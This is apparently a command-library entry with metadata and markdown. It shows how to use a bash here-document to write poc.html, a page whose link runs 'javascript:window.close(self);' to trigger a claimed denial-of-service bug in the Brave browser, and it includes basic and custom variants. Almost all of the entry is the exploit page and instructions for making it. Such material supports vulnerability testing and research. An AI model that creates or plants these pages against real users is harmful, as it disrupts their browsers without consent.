---
data: |-
  cat > poc.html << EOF
  <!DOCTYPE html>
  <html>
  <head>
      <title>Brave Window Object DoS Test POC</title>
  </head>
  <body>
      <p>Click the link below to test the vulnerability:</p>
      <a href="javascript:window.close(self);">Brave Window Object DoS Test POC</a>
  </body>
  </html>
  EOF
tags:
  - dos
  - poc-creation
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.786Z'
id: ed2ea2bb-a598-4b48-a872-358b4813bd37
verified: false
validated: true
submitted: true
---
# create-malicious-html

## Command

```bash
cat > poc.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Brave Window Object DoS Test POC</title>
</head>
<body>
    <p>Click the link below to test the vulnerability:</p>
    <a href="javascript:window.close(self);">Brave Window Object DoS Test POC</a>
</body>
</html>
EOF
```

## Description

This command creates a malicious HTML file named `poc.html` for exploiting the Brave browser window.close() vulnerability. It uses a here-document to embed the HTML content with the JavaScript trigger.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `poc.html` | Output filename for the HTML POC | Yes |
| `EOF` | Delimiter for the here-document | Yes |

## Examples

### Basic Usage

```bash
cat > poc.html << EOF
<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body><a href="javascript:window.close(self);">Test Link</a></body>
</html>
EOF
```

### Advanced Usage

Modify the here-document content for variations, such as adding more elements.

```bash
cat > custom_poc.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Custom DoS POC</title></head>
<body>
    <p>Custom test:</p>
    <a href="javascript:window.close(self);">Custom Link</a>
</body>
</html>
EOF
```

## Expected Output

The command runs silently if successful, creating the `poc.html` file. Verify with `ls poc.html` or `cat poc.html` to see the embedded HTML with the malicious link.

## Related

- [[Related Procedure|Brave-Browser-window.close-DoS-Exploitation]]
